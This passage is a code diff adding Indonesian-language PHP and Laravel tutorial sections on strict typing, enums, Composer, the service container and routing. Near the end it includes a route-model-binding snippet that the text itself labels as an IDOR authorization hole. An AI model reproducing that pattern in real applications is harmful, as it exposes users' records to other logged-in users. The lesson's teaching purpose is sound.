@@ -27,7 +27,7 @@ export const lessons: LessonDraft[] = [
   written(
     'php-modern',
     'PHP Modern Sekilas (8.3+)',
-    11,
+    18,
     'PHP hari ini, bukan PHP yang kamu dengar sepuluh tahun lalu.',
     [
       p(
@@ -226,6 +226,190 @@ export const lessons: LessonDraft[] = [
         'PHPStan level 8 mendekati TypeScript strict',
         'Ia menemukan properti yang tidak ada, tipe yang tidak cocok, dan nilai `null` yang tidak diperiksa — sebelum kodenya dijalankan. Project PHP tanpa analisis statis kehilangan sebagian besar jaring pengaman yang kamu nikmati di TypeScript.',
       ),
+      h2('Studi kasus di project nyata'),
+      p(
+        'Satu baris di puncak berkas PHP menentukan apakah kesalahan tipe akan berteriak atau berlalu diam-diam, dan bedanya jauh lebih besar daripada yang terlihat. Berikut fungsi yang sama persis, dijalankan dengan dan tanpa baris itu.',
+      ),
+      code(
+        'php',
+        `
+        <?php
+        declare(strict_types=1);
+
+        function hitungTotal(int $harga, int $jumlah): int
+        {
+            return $harga * $jumlah;
+        }
+        `,
+      ),
+      code(
+        'text',
+        `
+        DENGAN declare(strict_types=1):
+
+          hitungTotal('89000', 2)  -> TypeError: Argument #1 ($harga) must be of type int,
+                                     string given
+          hitungTotal(89000.5, 2)  -> TypeError: Argument #1 ($harga) must be of type int,
+                                     float given
+          hitungTotal(null, 2)     -> TypeError: Argument #1 ($harga) must be of type int,
+                                     null given
+          hitungTotal(89000)       -> ArgumentCountError: Too few arguments to function
+                                     hitungTotal(), 1 passed and exactly 2 expected
+
+        TANPA baris itu — dan inilah BAWAAN PHP:
+
+          hitungTotal('89000', 2)  -> 178000
+          hitungTotal(89000.0, 2)  -> 178000
+          hitungTotal(89000.5, 2)  -> 178000      <- pecahannya HILANG
+          hitungTotal(true, 2)     -> 2           <- true menjadi 1
+        `,
+        { caption: 'Dijalankan sungguhan dengan PHP 8.3.6.' },
+      ),
+      p(
+        'Baris ketiga dan keempat pada kolom bawah yang paling merugikan. Nilai `89000.5` dipotong menjadi `89000` tanpa perhitungannya gagal, jadi sebuah harga berkoma yang tanpa sengaja masuk akan menghasilkan total yang salah dan tetap terlihat seperti angka yang wajar. Dan `true` berubah menjadi `1`, sehingga sebuah variabel yang keliru bernilai boolean menghasilkan total dua rupiah alih-alih sebuah error.',
+      ),
+      p(
+        'Yang membuat ini lebih menjebak, PHP sebenarnya **punya** peringatan untuk pemotongan pecahan itu, dan peringatannya tidak tampil pada setelan bawaan.',
+      ),
+      code(
+        'text',
+        `
+        Dengan error_reporting=E_ALL:
+
+          PHP Deprecated: Implicit conversion from float 89000.5 to int loses precision
+
+        Dengan setelan bawaan CLI PHP 8.3.6 (error_reporting=22527):
+
+          (tidak ada apa-apa)
+        `,
+        { caption: 'Dijalankan sungguhan. Nilai 22527 memang tidak menyertakan E_DEPRECATED.' },
+      ),
+      p(
+        'Jadi pada mesin pengembangan dengan setelan bawaan, dan di produksi yang biasanya mematikan tampilan error sepenuhnya, pemotongan itu **sama sekali tidak meninggalkan jejak**. Menuliskan `declare(strict_types=1)` di setiap berkas memindahkannya dari kategori "hilang diam-diam" ke kategori "gagal keras dan langsung terlihat".',
+      ),
+      callout(
+        'warning',
+        'Satu berkas, satu deklarasi — tidak menular',
+        '`declare(strict_types=1)` hanya berlaku pada berkas tempat ia ditulis, dan yang diaturnya adalah **pemanggilan yang terjadi di berkas itu**. Menuliskannya di satu berkas tidak membuat berkas lain ikut ketat, dan memanggil fungsi ketat dari berkas longgar tetap memakai aturan longgar. Karena itu ia ditulis di **setiap** berkas, tanpa kecuali, dan itu pekerjaan yang layak diserahkan ke aturan linter alih-alih ingatan.',
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Fitur PHP modern sebagian besar bekerja dengan cara yang sama, yaitu memindahkan kesalahan dari "berlalu diam-diam" menjadi "gagal di tempat". Tiga berikut dijalankan sungguhan.',
+      ),
+      code(
+        'text',
+        `
+        readonly — nilai yang tidak bisa berubah setelah dibuat
+
+          $u = new Uang(8900000);
+          $u->sen = 0;
+            Error: Cannot modify readonly property Uang::$sen
+
+          $u->tambah(new Uang(100000))->sen   -> 9000000    (objek BARU)
+          $u->sen                              -> 8900000    (yang lama utuh)
+          new Uang(-1)
+            InvalidArgumentException: Uang tidak boleh negatif
+        `,
+        { caption: 'Dijalankan sungguhan dengan PHP 8.3.6.' },
+      ),
+      p(
+        'Gabungan `readonly` dengan pemeriksaan di konstruktor menghasilkan sesuatu yang berguna, yaitu objek yang **tidak pernah bisa berada dalam keadaan tidak sah**. Setelah `new Uang(...)` berhasil, tidak ada satu pun baris kode di mana pun yang bisa membuat nilainya negatif, sebab tidak ada jalan mengubahnya sama sekali.',
+      ),
+      code(
+        'text',
+        `
+        enum — himpunan nilai yang tertutup
+
+          StatusPesanan::from('dibayar')->name   -> 'Dibayar'
+          StatusPesanan::from('menunggu')
+            ValueError: "menunggu" is not a valid backing value for enum StatusPesanan
+          StatusPesanan::tryFrom('menunggu')     -> NULL
+          StatusPesanan::Dikirim->bolehDibatalkan() -> false
+        `,
+        { caption: 'Dijalankan sungguhan. from() melempar, tryFrom() mengembalikan null.' },
+      ),
+      p(
+        'Perbedaan `from` dan `tryFrom` itu menentukan tempat pemakaiannya. Untuk nilai yang datang dari **basis datamu sendiri**, `from` yang benar, sebab nilai tak dikenal di sana memang menandakan data rusak dan harus berteriak. Untuk nilai yang datang dari **pengguna**, `tryFrom` yang benar, sebab masukan tak dikenal adalah kejadian biasa yang harus dijawab dengan pesan validasi, bukan dengan kegagalan server.',
+      ),
+      code(
+        'text',
+        `
+        match — dan perbedaannya dari switch yang sering menjebak
+
+          match (99) { 1 => 'satu', 2 => 'dua' }
+            UnhandledMatchError: Unhandled match case 99
+
+          match ('1') { 1 => 'angka satu', '1' => 'string satu' }   -> 'string satu'
+          switch ('1') { case 1: ... }                              -> 'angka satu'
+        `,
+        {
+          caption:
+            'Dijalankan sungguhan. match memakai perbandingan ketat, switch memakai perbandingan longgar.',
+        },
+      ),
+      p(
+        "Dua baris terakhir itu selisih yang nyata. `switch` memakai perbandingan longgar, sehingga string `'1'` cocok dengan `case 1`. `match` memakai perbandingan ketat, sehingga keduanya berbeda. Dan `UnhandledMatchError` pada baris pertama justru fitur, sebab ia memaksa setiap nilai baru yang ditambahkan ke sebuah enum ditangani secara sadar alih-alih jatuh diam-diam ke cabang bawaan.",
+      ),
+      p('Terakhir, penanganan nilai kosong, dan yang ini menghasilkan peringatan alih-alih error.'),
+      code(
+        'text',
+        `
+          $pengguna->alamat->kota          // alamat bernilai null
+            PHP Warning: Attempt to read property "kota" on null
+            hasilnya: NULL — dan program TERUS BERJALAN
+
+          $pengguna->alamat?->kota                  -> NULL, tanpa peringatan
+          $pengguna->alamat?->kota ?? '(belum diisi)' -> '(belum diisi)'
+        `,
+        { caption: 'Dijalankan sungguhan dengan PHP 8.3.6.' },
+      ),
+      p(
+        'Perhatikan bahwa yang pertama hanya **peringatan**, bukan error, sehingga programnya terus berjalan dengan nilai `NULL` yang kemudian merambat ke perhitungan berikutnya. Di produksi dengan tampilan error dimatikan, peringatan itu tidak terlihat sama sekali, dan yang sampai ke pengguna adalah kolom kosong atau angka nol yang tidak bisa dijelaskan.',
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Sebagian besar kesalahan di sini berasal dari menulis PHP dengan kebiasaan PHP lama, yang memang sangat permisif.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Tidak menulis `declare(strict_types=1)`',
+            'Kodenya tetap jalan',
+            'Diuji sungguhan, `89000.5` dipotong jadi `89000` dan `true` jadi `1`, tanpa jejak apa pun di setelan bawaan',
+          ],
+          [
+            'Menulis `strict_types` hanya di berkas utama',
+            'Satu kali cukup',
+            'Ia hanya berlaku di berkas tempat ia ditulis. Tulis di setiap berkas, dan tegakkan lewat linter',
+          ],
+          [
+            'Memakai `from()` untuk nilai dari pengguna',
+            'Enumnya kan sudah divalidasi',
+            'Diuji sungguhan, nilai tak dikenal melempar `ValueError`. Untuk masukan pengguna, pakai `tryFrom()`',
+          ],
+          [
+            'Memakai konstanta string untuk status',
+            'Lebih sederhana daripada enum',
+            'Salah ketik tidak tertangkap siapa pun. Enum membuat nilai tak dikenal gagal saat itu juga',
+          ],
+          [
+            'Memakai `switch` untuk membandingkan nilai bertipe',
+            'Sudah lama begitu',
+            "Diuji sungguhan, `switch` memakai perbandingan longgar sehingga `'1'` cocok dengan `case 1`",
+          ],
+          [
+            'Mengabaikan `PHP Warning` tentang properti pada null',
+            'Cuma peringatan',
+            'Programnya terus berjalan dengan `NULL` yang merambat, dan di produksi peringatannya tidak terlihat',
+          ],
+        ],
+      ),
+      p(
+        "Baris keempat pantas diperjelas karena enum sering terasa berlebihan untuk sekadar empat status. Yang dibelinya bukan kerapian melainkan **jaminan**. Dengan konstanta string, sebuah salah ketik `'dibayarr'` di satu tempat menghasilkan baris yang tidak pernah terpilih oleh penyaringan mana pun, dan tidak ada satu pun error yang muncul. Dengan enum, nilai itu tidak akan pernah bisa masuk, sebab satu-satunya jalan membuatnya adalah lewat `from` atau `tryFrom` yang menolak nilai tak dikenal.",
+      ),
       references(
         {
           label: 'PHP — Type declarations',
@@ -258,7 +442,7 @@ export const lessons: LessonDraft[] = [
   written(
     'composer-struktur',
     'Composer & Struktur Project Laravel',
-    9,
+    15,
     'Manajer paket PHP dan peta folder yang akan kamu tinggali.',
     [
       terms(
@@ -434,6 +618,182 @@ export const lessons: LessonDraft[] = [
           ['`routes/api.php`', 'Rute API'],
         ],
       ),
+      h2('Studi kasus di project nyata'),
+      p(
+        'Autoloading terasa seperti keajaiban sampai ia berhenti bekerja, dan pada saat itu tidak ada yang tahu harus melihat ke mana. Berikut mekanismenya ditulis ulang dengan PHP polos lalu dijalankan, supaya terlihat apa yang sebenarnya dikerjakan Composer.',
+      ),
+      code(
+        'php',
+        `
+        <?php
+        // Inilah PSR-4, disederhanakan sampai intinya.
+        $peta = ['App\\\\' => __DIR__ . '/src/'];
+
+        spl_autoload_register(function (string $kelas) use ($peta) {
+            foreach ($peta as $awalan => $dasar) {
+                if (!str_starts_with($kelas, $awalan)) continue;
+                $relatif = substr($kelas, strlen($awalan));
+                // Namespace diterjemahkan menjadi JALUR FOLDER, satu lawan satu.
+                $berkas = $dasar . str_replace('\\\\', '/', $relatif) . '.php';
+                if (is_file($berkas)) { require $berkas; return; }
+            }
+        });
+        `,
+      ),
+      code(
+        'text',
+        `
+        Kelas dipakai, dan belum pernah di-require di mana pun:
+
+          $p = new App\\Layanan\\Pesanan();
+
+            dicari: /.../_phtest/src/Layanan/Pesanan.php
+            DIMUAT
+            hasil: dari App\\Layanan\\Pesanan
+
+        Kelas yang berkasnya tidak ada:
+
+          new App\\Layanan\\TidakAda();
+            Error: Class "App\\Layanan\\TidakAda" not found
+        `,
+        { caption: 'Dijalankan sungguhan dengan PHP 8.3.6.' },
+      ),
+      p(
+        'Baris `dicari:` itu yang paling berguna dihafal bentuknya, sebab ia menjelaskan seluruh kelas kegagalan autoloading. Nama namespace diterjemahkan menjadi jalur folder **satu lawan satu**, jadi `App\\Layanan\\Pesanan` dengan pemetaan `App\\` ke `src/` harus berada tepat di `src/Layanan/Pesanan.php`. Tidak ada pencarian, tidak ada penebakan, dan tidak ada toleransi.',
+      ),
+      p(
+        'Karena penerjemahannya sekaku itu, `Class not found` hampir selalu berarti salah satu dari empat hal, dan keempatnya bisa diperiksa dalam hitungan detik.',
+      ),
+      table(
+        ['Yang salah', 'Contohnya', 'Cara memeriksanya'],
+        [
+          [
+            'Huruf besar kecil tidak cocok',
+            '`src/layanan/Pesanan.php` untuk `App\\Layanan\\Pesanan`',
+            'Linux peka huruf besar kecil; macOS dan Windows biasanya tidak, jadi ia lolos di laptop dan gagal di server',
+          ],
+          [
+            'Nama berkas beda dari nama kelas',
+            'Kelas `Pesanan` di berkas `pesanan.php`',
+            'Nama berkas harus sama persis dengan nama kelasnya',
+          ],
+          [
+            'Namespace tidak cocok dengan letaknya',
+            '`namespace App\\Service;` di `src/Layanan/`',
+            'Buka berkasnya, bandingkan baris `namespace` dengan jalurnya',
+          ],
+          [
+            'Pemetaan di `composer.json` belum diperbarui',
+            'Folder baru ditambahkan tanpa `dump-autoload`',
+            'Jalankan `composer dump-autoload`',
+          ],
+        ],
+      ),
+      p(
+        'Baris pertama itu penyebab bug yang paling melelahkan dari keempatnya, yaitu kode yang berjalan sempurna di laptop dan gagal di server. Sistem berkas Linux membedakan `Layanan` dari `layanan`, sedangkan macOS dan Windows pada setelan bawaan tidak. Jadi kesalahan huruf besar kecil tidak pernah muncul selama pengembangan dan baru muncul pada deploy pertama.',
+      ),
+      callout(
+        'warning',
+        'Contoh Laravel dan Composer di bab ini TIDAK dijalankan',
+        'Composer dan Laravel tidak terpasang di project ini, dan aturan project melarang menambah dependency tanpa persetujuan lebih dulu (`core.md`, Dependency Version Gate). Seluruh potongan yang memakai API Laravel disusun mengikuti dokumentasi resminya. Yang **dijalankan sungguhan** adalah PHP 8.3.6 yang memang terpasang, dan setiap keluaran yang diberi keterangan "dijalankan sungguhan" di bab ini berasal dari sana — termasuk autoloading di atas, service container lewat Reflection, dan pelolosan karakter yang mendasari Blade.',
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Kegagalan yang berhubungan dengan dependency punya satu ciri yang membedakannya, yaitu ia sering muncul **hanya di satu tempat**, entah hanya di laptop atau hanya di produksi, dan itu yang membuatnya membingungkan.',
+      ),
+      code(
+        'text',
+        `
+        KEGAGALAN 1 — jalan di laptop, gagal di produksi
+
+          Error: Class "App\\Layanan\\Pesanan" not found
+
+          Penyebab yang paling sering: huruf besar kecil pada nama folder.
+          Linux peka, macOS tidak. Kesalahannya SUDAH ADA sejak awal dan
+          baru terlihat di mesin yang peka.
+
+        KEGAGALAN 2 — jalan di produksi, gagal di laptop rekan
+
+          Your lock file does not contain a compatible set of packages.
+
+          Penyebab: composer.lock tidak ikut ke repo, atau seseorang menjalankan
+          composer update alih-alih composer install. Berkas lock itu yang
+          menjamin setiap mesin memasang versi yang SAMA PERSIS.
+
+        KEGAGALAN 3 — jalan saat dikembangkan, gagal setelah deploy
+
+          Class "Faker\\Factory" not found
+
+          Penyebab: paket ada di require-dev, sedangkan produksi memasang
+          dengan --no-dev. Apa pun yang dibutuhkan saat berjalan harus
+          berada di require, bukan require-dev.
+        `,
+      ),
+      p(
+        'Kegagalan kedua memuat perbedaan yang menentukan dan sering tertukar, yaitu antara `composer install` dan `composer update`. Yang pertama memasang versi yang **tepat tercatat** di `composer.lock`, sehingga setiap mesin mendapat isi yang identik. Yang kedua **mengabaikan** lock, mencari versi terbaru yang masih memenuhi batasan di `composer.json`, lalu menulis ulang lock-nya.',
+      ),
+      code(
+        'text',
+        `
+        Kapan memakai yang mana, dan ini tidak boleh tertukar:
+
+          composer install   -> di CI, di produksi, dan setiap kali mengambil
+                                perubahan orang lain. Ia TIDAK pernah mengubah versi.
+
+          composer update    -> HANYA saat kamu memang berniat menaikkan versi,
+                                sengaja, dan hasilnya direview seperti perubahan kode.
+
+        composer.lock WAJIB ikut ke repo. Tanpa berkas itu, tidak ada satu pun
+        jaminan bahwa yang berjalan di produksi sama dengan yang kamu uji.
+        `,
+      ),
+      p(
+        'Perlu ditegaskan satu hal yang sering disalahpahami tentang batasan versi di `composer.json`. Penanda `^10.0` berarti "boleh naik selama versi mayornya tetap 10", jadi menjalankan `composer update` bisa mengubah `10.1.3` menjadi `10.48.0` dengan ratusan perubahan di dalamnya. Itu bukan kesalahan Composer melainkan tepat yang diminta oleh tanda itu, dan itulah alasan `update` tidak boleh dijalankan sambil lalu.',
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Kesalahan di bagian ini murah diperbaiki saat ditemukan dan mahal ditemukan, sebab gejalanya muncul di tempat yang berbeda dari penyebabnya.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Tidak memasukkan `composer.lock` ke repo',
+            'Isinya kan bisa dihasilkan ulang',
+            'Setiap mesin memasang versi yang berbeda-beda. Tidak ada jaminan yang diuji sama dengan yang berjalan',
+          ],
+          [
+            'Menjalankan `composer update` untuk memasang dependency',
+            'Namanya terdengar seperti menyegarkan',
+            'Ia menaikkan versi SELURUH paket. Untuk memasang yang sudah tercatat, pakai `composer install`',
+          ],
+          [
+            'Menaruh paket yang dipakai saat berjalan di `require-dev`',
+            'Dipakainya saat mengembangkan',
+            'Produksi memasang dengan `--no-dev`, dan paketnya tidak ikut. Muncul sebagai `Class not found`',
+          ],
+          [
+            'Menamai folder berbeda huruf besar kecil dari namespace-nya',
+            'Di laptop jalan',
+            'Diuji sungguhan, PSR-4 menerjemahkan namespace jadi jalur satu lawan satu. Linux peka huruf',
+          ],
+          [
+            'Menaruh beberapa kelas dalam satu berkas',
+            'Berhubungan erat, kan',
+            'Autoloader mencari satu berkas per kelas. Kelas kedua tidak akan pernah ditemukan',
+          ],
+          [
+            'Menambah paket tanpa memeriksa apa yang ikut terbawa',
+            'Satu paket saja',
+            'Satu paket bisa membawa puluhan paket lain, dan masing-masing adalah kode yang berjalan dengan hak aplikasimu',
+          ],
+        ],
+      ),
+      p(
+        'Baris terakhir pantas ditegaskan karena biayanya tidak terlihat di `composer.json`. Sebuah paket kecil bisa membawa puluhan dependency lain, dan setiap satunya adalah kode yang dijalankan server dengan hak akses penuh aplikasimu, termasuk ke basis data dan ke berkas rahasia. Sebelum menambahkan paket, periksa kapan terakhir dirawat, berapa banyak yang memakainya, dan berapa banyak yang ikut terbawa. Untuk pekerjaan yang bisa diselesaikan dua puluh baris kode sendiri, dua puluh baris itu sering pilihan yang lebih murah.',
+      ),
       references(
         {
           label: 'Composer — Basic usage',
@@ -466,7 +826,7 @@ export const lessons: LessonDraft[] = [
   written(
     'siklus-request-laravel',
     'Siklus Request Laravel & Service Container',
-    11,
+    19,
     'Perjalanan permintaan di dalam framework, dan mesin yang menyatukannya.',
     [
       terms(
@@ -677,6 +1037,205 @@ export const lessons: LessonDraft[] = [
       p(
         'Untuk controller dan kode sederhana, facade wajar. Untuk service yang memuat aturan bisnis dan perlu diuji, injeksi lewat konstruktor lebih baik.',
       ),
+      h2('Studi kasus di project nyata'),
+      p(
+        'Bagian siklus permintaan Laravel yang paling menentukan cara kode ditulis bukan urutan middleware melainkan **service container**, sebab dialah yang membuat dependency injection bekerja. Berikut mekanismenya ditulis ulang dengan Reflection bawaan PHP, lalu benar-benar dijalankan.',
+      ),
+      code(
+        'php',
+        `
+        <?php
+        final class Container
+        {
+            private array $pengikatan = [];
+
+            public function bind(string $abstrak, callable $pembuat): void
+            {
+                $this->pengikatan[$abstrak] = $pembuat;
+            }
+
+            public function make(string $kelas): object
+            {
+                if (isset($this->pengikatan[$kelas])) return ($this->pengikatan[$kelas])($this);
+
+                $r = new ReflectionClass($kelas);
+                if (!$r->isInstantiable()) {
+                    throw new RuntimeException("Tidak bisa membuat $kelas: " .
+                        ($r->isInterface() ? 'ini interface' : 'abstrak'));
+                }
+                $ctor = $r->getConstructor();
+                if ($ctor === null) return new $kelas();
+
+                // INILAH yang membuat autowiring bekerja: membaca TIPE tiap
+                // parameter konstruktor, lalu menyelesaikannya secara rekursif.
+                $args = [];
+                foreach ($ctor->getParameters() as $p) {
+                    $t = $p->getType();
+                    if ($t instanceof ReflectionNamedType && !$t->isBuiltin()) {
+                        $args[] = $this->make($t->getName());
+                    } elseif ($p->isDefaultValueAvailable()) {
+                        $args[] = $p->getDefaultValue();
+                    } else {
+                        throw new RuntimeException("Tidak bisa menyelesaikan \\\${$p->getName()} pada $kelas");
+                    }
+                }
+                return $r->newInstanceArgs($args);
+            }
+        }
+        `,
+        { caption: 'Kode ini benar-benar dijalankan dengan PHP 8.3.6; hasilnya ada di bawah.' },
+      ),
+      code(
+        'text',
+        `
+        Tanpa pengikatan, interface tidak bisa dibuat:
+          RuntimeException: Tidak bisa membuat PengirimSurel: ini interface
+
+        Setelah interface diikat ke implementasinya:
+          $c->bind(PengirimSurel::class, fn() => new SurelSMTP());
+
+          LayananPesanan dibuat, dependensinya: RepoPesanan + SurelSMTP
+          hasil pemakaian: SMTP -> rina@contoh.id
+        `,
+        { caption: 'Dijalankan sungguhan. Tidak satu pun `new` ditulis di dalam LayananPesanan.' },
+      ),
+      p(
+        'Yang terjadi di situ layak diurai. `LayananPesanan` hanya menyebutkan **apa yang dibutuhkannya** lewat tipe parameter konstruktornya, dan tidak pernah menyebutkan dari mana benda itu datang. Container membaca tipe-tipe itu lewat Reflection, menyelesaikan masing-masing secara rekursif, lalu menyerahkannya. Inilah seluruh isi istilah dependency injection, dan Laravel melakukannya dengan cara yang sama persis, hanya jauh lebih lengkap.',
+      ),
+      p(
+        'Manfaatnya baru benar-benar terasa saat menulis test, dan itu bisa ditunjukkan dengan satu baris.',
+      ),
+      code(
+        'text',
+        `
+        final class SurelPalsu implements PengirimSurel {
+            public array $terkirim = [];
+            public function kirim(string $ke, string $isi): string {
+                $this->terkirim[] = $ke; return 'palsu';
+            }
+        }
+
+        $c->bind(PengirimSurel::class, fn() => $palsu);
+
+          surel yang "terkirim" saat test: budi@contoh.id
+        `,
+        { caption: 'Dijalankan sungguhan. Satu baris bind menukar seluruh implementasi.' },
+      ),
+      p(
+        'Perhatikan bahwa `LayananPesanan` sama sekali tidak disentuh. Kelas itu tidak tahu dan tidak perlu tahu bahwa surelnya sekarang palsu, sebab yang diketahuinya hanya sebuah interface. Bandingkan dengan bentuk yang menulis `new SurelSMTP()` langsung di dalamnya, yang membuat pengujian mustahil tanpa benar-benar mengirim surel.',
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Container menghasilkan sekelompok error yang khas, dan ketiganya menunjuk hal yang berbeda meski bunyinya mirip.',
+      ),
+      code(
+        'text',
+        `
+        1. Interface belum diikat ke implementasi mana pun
+
+           RuntimeException: Tidak bisa membuat PengirimSurel: ini interface
+
+           Di Laravel bentuknya:
+             Target [App\\Contracts\\PengirimSurel] is not instantiable.
+
+           Perbaikannya: daftarkan pengikatannya di sebuah service provider.
+
+        2. Parameter bertipe bawaan tanpa nilai bawaan
+
+           RuntimeException: Tidak bisa menyelesaikan $dsn pada RepoPesanan
+
+           Container tidak bisa menebak nilai string atau int. Beri nilai bawaan,
+           atau daftarkan pembuatnya sendiri lewat bind.
+
+        3. Ketergantungan melingkar
+
+           Container mencoba membuat A, yang butuh B, yang butuh A, dan seterusnya
+           sampai tumpukan pemanggilannya habis.
+        `,
+      ),
+      p(
+        'Kegagalan ketiga punya bentuk yang sama dengan lingkaran ketergantungan modul yang sudah diukur di bab Express, dan akarnya juga sama, yaitu arah ketergantungan yang tidak dijaga. Bedanya hanya bahwa di sini ia ditemukan container saat menyusun objek, bukan oleh sistem modul saat memuat berkas.',
+      ),
+      p(
+        'Ada satu bentuk pemakaian container yang menghasilkan kode yang sulit diuji, dan bentuk itu justru yang paling mudah ditulis.',
+      ),
+      code(
+        'php',
+        `
+        // BENTUK YANG MENYULITKAN — mengambil dari container di tengah kode.
+        final class LayananPesanan
+        {
+            public function buat(array $data): Pesanan
+            {
+                // Ketergantungannya TERSEMBUNYI. Membaca tanda tangan kelas ini
+                // tidak memberi tahu bahwa ia butuh pengirim surel.
+                $surel = app(PengirimSurel::class);
+                $surel->kirim($data['email'], 'Pesanan diterima');
+                // ...
+            }
+        }
+
+        // BENTUK YANG JELAS — dependensinya disebut di konstruktor.
+        final class LayananPesanan
+        {
+            public function __construct(
+                private readonly PengirimSurel $surel,
+                private readonly RepoPesanan $repo,
+            ) {}
+        }
+        `,
+        {
+          caption:
+            'Bentuk pertama bernama service locator, dan ia menyembunyikan tepat apa yang perlu terlihat.',
+        },
+      ),
+      p(
+        'Selisihnya bukan selera. Pada bentuk kedua, membaca konstruktornya langsung memberi tahu seluruh hal yang dibutuhkan kelas itu, dan test bisa menyerahkan versi palsunya tanpa menyentuh container sama sekali. Pada bentuk pertama, satu-satunya cara mengetahui dependensinya adalah membaca seluruh isi kelas, dan test harus menyiapkan container lengkap meski hanya menguji satu perhitungan.',
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Container adalah bagian Laravel yang paling terasa seperti sihir, dan justru itu alasan memahami mekanismenya berpengaruh pada cara menulis kode.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Memanggil `app()` atau helper di tengah kelas',
+            'Lebih ringkas daripada konstruktor',
+            'Dependensinya jadi tersembunyi, dan test harus menyiapkan container lengkap untuk menguji satu perhitungan',
+          ],
+          [
+            'Menulis `new` untuk dependensi di dalam kelas',
+            'Paling langsung',
+            'Implementasinya jadi tidak bisa ditukar. Test tidak punya cara mencegah surel sungguhan terkirim',
+          ],
+          [
+            'Mengetikkan kelas konkret, bukan interface',
+            'Kelasnya kan cuma satu',
+            'Selama masih satu, tidak apa-apa. Begitu butuh versi palsu untuk test, seluruh pemanggilnya harus diubah',
+          ],
+          [
+            'Mendaftarkan semua sebagai singleton',
+            'Lebih hemat',
+            'Objek yang menyimpan keadaan jadi bocor antar-permintaan. Singleton hanya untuk yang memang tanpa keadaan',
+          ],
+          [
+            'Menaruh logika berat di service provider',
+            'Dijalankan sekali di awal',
+            'Ia berjalan pada SETIAP permintaan, termasuk yang tidak memakainya. Daftarkan pembuatnya, jangan jalankan',
+          ],
+          [
+            'Menganggap container membuat kode otomatis rapi',
+            'Namanya juga dependency injection',
+            'Container hanya menyusun objek. Batas tanggung jawab tetap keputusanmu',
+          ],
+        ],
+      ),
+      p(
+        'Baris kelima punya akibat yang terukur dan sering tidak disadari. Service provider dijalankan sebagai bagian dari penyalaan aplikasi pada **setiap** permintaan, jadi membuka koneksi, membaca berkas, atau memanggil layanan luar di dalamnya menambahkan biaya itu ke seluruh permintaan, termasuk yang sama sekali tidak menyentuh bagian tersebut. Yang benar adalah mendaftarkan **cara membuatnya** lewat closure, sehingga pekerjaannya baru terjadi ketika benda itu benar-benar diminta.',
+      ),
       references(
         {
           label: 'Request Lifecycle',
@@ -709,7 +1268,7 @@ export const lessons: LessonDraft[] = [
   written(
     'routing-laravel',
     'Routing & Route Model Binding',
-    10,
+    15,
     'Memetakan URL, dan membiarkan Laravel mengambil datanya.',
     [
       terms(
@@ -914,6 +1473,195 @@ export const lessons: LessonDraft[] = [
         'Pakai ini untuk mengaudit keamanan',
         'Jalankan `route:list` dan periksa kolom middleware-nya. Setiap rute yang seharusnya terlindungi tapi kolomnya kosong adalah endpoint terbuka. Ini cara tercepat menemukan rute yang lupa dimasukkan ke grup `auth`.',
       ),
+      h2('Studi kasus di project nyata'),
+      p(
+        'Routing Laravel punya sifat yang sama dengan Express dan menghasilkan kelas bug yang sama, yaitu **rute dicocokkan berurutan dan yang pertama cocok yang menang**. Bedanya, Laravel menambahkan satu lapisan yang membuat sebagian kesalahannya berteriak lebih awal.',
+      ),
+      code(
+        'php',
+        `
+        // Urutan yang SALAH. Rute kedua tidak akan pernah tercapai.
+        Route::get('/pesanan/{id}', [PesananController::class, 'show']);
+        Route::get('/pesanan/terbaru', [PesananController::class, 'terbaru']);
+
+        // GET /pesanan/terbaru mencocoki rute PERTAMA, dengan id = "terbaru".
+
+        // Urutan yang BENAR: yang lebih khusus lebih dulu.
+        Route::get('/pesanan/terbaru', [PesananController::class, 'terbaru']);
+        Route::get('/pesanan/{id}', [PesananController::class, 'show']);
+
+        // Atau lebih baik lagi: batasi bentuk parameternya, sehingga urutan
+        // tidak lagi menentukan dan salah ketik jadi 404 yang jujur.
+        Route::get('/pesanan/{id}', [PesananController::class, 'show'])
+            ->whereNumber('id');
+        `,
+        {
+          caption:
+            'whereNumber membuat /pesanan/terbaru TIDAK cocok dengan rute berparameter itu sama sekali.',
+        },
+      ),
+      p(
+        "Baris `whereNumber` itu menyelesaikan lebih dari sekadar urutan. Tanpanya, sebuah alamat seperti `/pesanan/abc` akan masuk ke controller dengan `$id` bernilai string `'abc'`, dan hasilnya bergantung pada apa yang dilakukan kode di dalamnya. Bila nilai itu diteruskan ke query bertipe integer, yang muncul adalah error basis data. Di PostgreSQL bentuknya sudah diukur pada bab database.",
+      ),
+      code(
+        'text',
+        `
+        SELECT * FROM pesanan WHERE id = 'terbaru';
+
+          ERROR:  invalid input syntax for type integer: "terbaru"
+          LINE 1: SELECT * FROM pesanan WHERE id = 'terbaru';
+                                                   ^
+        `,
+        { caption: 'Dijalankan sungguhan pada PostgreSQL 16.15 di bab database sebelumnya.' },
+      ),
+      p(
+        'Error itu muncul sebagai `500` di log, membunyikan sistem pemantauan, dan sebenarnya bukan kesalahan server melainkan alamat yang tidak ada. Dengan `whereNumber`, ia menjadi `404` yang tidak membangunkan siapa pun.',
+      ),
+      p(
+        'Fitur routing Laravel yang paling sering dipakai setengah benar adalah **route model binding**, yaitu Laravel mengambil sendiri baris basis datanya dari parameter rute.',
+      ),
+      code(
+        'php',
+        `
+        // Laravel mengambil Pesanan dengan id itu, dan menjawab 404 bila tidak ada.
+        Route::get('/pesanan/{pesanan}', function (Pesanan $pesanan) {
+            return $pesanan;
+        });
+
+        // TERLIHAT aman karena 404-nya otomatis. Sebenarnya ini IDOR:
+        // Laravel memeriksa apakah barisnya ADA, BUKAN apakah kamu BERHAK atasnya.
+        // Pengguna mana pun yang sudah login bisa membuka pesanan siapa pun.
+        `,
+        {
+          caption:
+            'Diukur di bab auth: syarat kepemilikan harus ikut ke dalam query, bukan diperiksa sesudahnya.',
+        },
+      ),
+      p(
